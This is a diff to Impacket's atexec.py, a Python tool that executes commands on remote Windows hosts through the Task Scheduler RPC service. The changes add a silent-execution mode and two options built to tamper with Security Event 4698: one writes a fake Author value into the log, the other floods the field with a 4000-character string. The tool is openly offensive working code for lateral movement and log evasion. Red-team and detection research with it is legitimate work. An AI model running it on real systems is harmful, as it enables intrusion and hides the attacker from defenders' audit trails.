@@ -1,21 +1,27 @@
 #!/usr/bin/env python
-# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
+# Impacket - Collection of Python classes for working with network protocols.
 #
-# This software is provided under under a slightly modified version
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
+#
+# This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
-# ATSVC example for some functions implemented, creates, enums, runs, delete jobs
-# This example executes a command on the target machine through the Task Scheduler 
-# service. Returns the output of such command
+# Description:
+#   ATSVC example for some functions implemented, creates, enums, runs, delete jobs
+#   This example executes a command on the target machine through the Task Scheduler
+#   service. Returns the output of such command
 #
 # Author:
-#  Alberto Solino (@agsolino)
+#   Alberto Solino (@agsolino)
+#   Log Poisoning / Overflow implementation by Ruben Enkaoua (@rubenlabs with Kopnex / Cymulate)
 #
 # Reference for:
-#  DCE/RPC for TSCH
-from __future__ import division
-from __future__ import print_function
+#   DCE/RPC for TSCH
+#
+
 import string
 import sys
 import argparse
@@ -34,10 +40,11 @@ from impacket.krb5.keytab import Keytab
 from six import PY2
 
 CODEC = sys.stdout.encoding
+AUTHOR_OVERFLOW_LEN = 4000
 
 class TSCH_EXEC:
     def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None,
-                 command=None, sessionId=None):
+                 command=None, sessionId=None, silentCommand=False, authorLog=None, overflow=False):
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -47,6 +54,9 @@ class TSCH_EXEC:
         self.__doKerberos = doKerberos
         self.__kdcHost = kdcHost
         self.__command = command
+        self.__silentCommand = silentCommand
+        self.__authorLog = authorLog
+        self.__overflow = overflow
         self.sessionId = sessionId
 
         if hashes is not None:
@@ -115,9 +125,23 @@ class TSCH_EXEC:
             cmd = "cmd.exe"
             args = "/C %s > %%windir%%\\Temp\\%s 2>&1" % (self.__command, tmpFileName)
 
+        registrationInfo = ''
+        if self.__overflow is True:
+            logging.info('Using Author overflow (%d characters) for Task Scheduler log tampering' % AUTHOR_OVERFLOW_LEN)
+            registrationInfo = """  <RegistrationInfo>
+    <Author>%s</Author>
+  </RegistrationInfo>
+""" % ('A' * AUTHOR_OVERFLOW_LEN)
+        elif self.__authorLog is not None:
+            logging.info('Using fake Author "%s" for Task Scheduler log poisoning' % self.__authorLog)
+            registrationInfo = """  <RegistrationInfo>
+    <Author>%s</Author>
+  </RegistrationInfo>
+""" % xml_escape(self.__authorLog)
+
         xml = """<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
+%s  <Triggers>
     <CalendarTrigger>
       <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
       <Enabled>true</Enabled>
@@ -157,7 +181,9 @@ class TSCH_EXEC:
     </Exec>
   </Actions>
 </Task>
-        """ % (xml_escape(cmd), xml_escape(args))
+        """ % (registrationInfo,
+            (xml_escape(cmd) if self.__silentCommand is False else self.__command.split()[0]),
+            (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
         taskCreated = False
         try:
             logging.info('Creating task \\%s' % tmpName)
@@ -201,6 +227,10 @@ class TSCH_EXEC:
             dce.disconnect()
             return
 
+        if self.__silentCommand:
+            dce.disconnect()
+            return
+
         smbConnection = rpctransport.get_smb_connection()
         waitOnce = True
         while True:
@@ -222,7 +252,7 @@ class TSCH_EXEC:
                     raise
         logging.debug('Deleting file ADMIN$\\Temp\\%s' % tmpFileName)
         smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)
- 
+
         dce.disconnect()
 
 
@@ -235,8 +265,16 @@ if __name__ == '__main__':
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
     parser.add_argument('command', action='store', nargs='*', default=' ', help='command to execute at the target ')
     parser.add_argument('-session-id', action='store', type=int, help='an existed logon session to use (no output, no cmd.exe)')
-
     parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
+    parser.add_argument('-silentcommand', action='store_true', default = False, help='does not execute cmd.exe to run '
+                                                                                     'given command (no output)')
+    author_group = parser.add_mutually_exclusive_group()
+    author_group.add_argument('-overflow', action='store_true', default=False,
+                              help='overflow Security Event 4698 by setting a %d-byte Author in the task XML '
+                                   '(mutually exclusive with -author-log)' % AUTHOR_OVERFLOW_LEN)
+    author_group.add_argument('-author-log', action='store', metavar='author',
+                              help='poison Security Event 4698 Author field with the given value '
+                                   '(mutually exclusive with -overflow)')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                        '"%s"). If errors are detected, run chcp.com at the target, '
@@ -264,7 +302,7 @@ if __name__ == '__main__':
     options = parser.parse_args()
 
     # Init the example's logger theme
-    logger.init(options.ts)
+    logger.init(options.ts, options.debug)
 
     if options.codec is not None:
         CODEC = options.codec
@@ -277,13 +315,6 @@ if __name__ == '__main__':
     if ''.join(options.command) == ' ':
         logging.error('You need to specify a command to execute!')
         sys.exit(1)
-
-    if options.debug is True:
-        logging.getLogger().setLevel(logging.DEBUG)
-        # Print the Library's installation path
-        logging.debug(version.getInstallationPath())
-    else:
-        logging.getLogger().setLevel(logging.INFO)
 
     domain, username, password, address = parse_target(options.target)
 
@@ -303,5 +334,6 @@ if __name__ == '__main__':
         options.k = True
 
     atsvc_exec = TSCH_EXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
-                           ' '.join(options.command), options.session_id)
+                           ' '.join(options.command), options.session_id, options.silentcommand,
+                           options.author_log, options.overflow)
     atsvc_exec.play(address)
